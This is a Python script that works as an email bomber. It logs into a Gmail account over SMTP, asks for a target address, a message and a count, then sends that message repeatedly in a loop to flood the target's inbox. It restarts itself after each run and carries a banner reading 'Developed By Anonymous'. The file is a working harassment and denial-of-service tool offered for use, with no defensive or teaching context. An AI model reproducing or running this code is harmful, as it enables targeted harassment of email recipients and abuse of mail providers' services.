import smtplib
import time
import sys
import os, credential
from termcolor import colored
os.system('clear')

ascii_art = print(colored('''
     _____                                        
  __|___  |__  ______  _____  ____    __  ______  
 |   ___|    ||      >/     \|    \  /  ||      > 
 |   ___|    ||     < |     ||     \/   ||     <  
 |______|  __||______>\_____/|__/\__/|__||______> 
    |_____|                                       
                                                  
''',"red"))
print("\n")
print(colored("\t\tDeveloped By Anonymous....","green"))
print("\n\n\n")
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(credential.gmail, credential.pw)

def mail_bomber():
	print("\n")
	mail_2 = input(colored("Enter email you want to bomb : ","cyan"))
	print("\n")
	msg = input(colored("Enter a message for bombing : ","yellow"))
	print("\n")
	much = int(input(colored("Enter number of bombs : ","red")))
	
	animation = "|/-\\"
	print("\n")
	print(colored("========================Bombing=====================","yellow"))
	print("\n")
	for i in range(1,much+1):
	   time.sleep(0.0001)
	   sys.stdout.write("\r" + animation[i %
	   len(animation)])
	   sys.stdout.flush()
	   print(i," \nPlease wait Bombing : ", mail_2)
	   print("\n")
	   
	   server.sendmail(credential.gmail, mail_2, msg)
	   print("\n")
	
	   time.sleep(0.01)
	   os.system('clear')
	print(colored("\nBombed Succesfully !", "green"))
	
	mail_bomber()
mail_bomber()

	